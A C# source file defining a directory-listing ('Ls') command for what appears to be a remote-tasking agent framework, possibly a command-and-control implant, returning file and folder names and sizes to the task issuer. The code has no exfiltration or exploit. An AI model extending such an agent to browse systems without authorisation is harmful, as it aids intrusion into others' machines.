using Agent.Models;
using BinarySerializer;
using Shared;
using Shared.ResultObjects;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class ListiDirectoryCommand : AgentCommand
    {
        public override CommandId Command => CommandId.Ls;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            string path;

            if (!task.HasParameter(ParameterId.Path))
                path = Directory.GetCurrentDirectory();
            else
                path = task.GetParameter<string>(ParameterId.Path);

            var list = new List<ListDirectoryResult>();
            var directories = Directory.GetDirectories(path);
            foreach (var dir in directories)
            {
                var dirInfo = new DirectoryInfo(dir);
                list.Add(new ListDirectoryResult()
                {
                    Name = dirInfo.Name,
                    Length = 0,
                    IsFile= false,
                });
            }

            var files = Directory.GetFiles(path);
            foreach (var file in files)
            {
                var fileInfo = new FileInfo(file);
                list.Add(new ListDirectoryResult()
                {
                    Name = Path.GetFileName(fileInfo.FullName),
                    Length = fileInfo.Length,
                    IsFile= true
                });
            }

            context.AppendResult($"Listing of {path}");
            context.Objects(list);
        }
    }
}
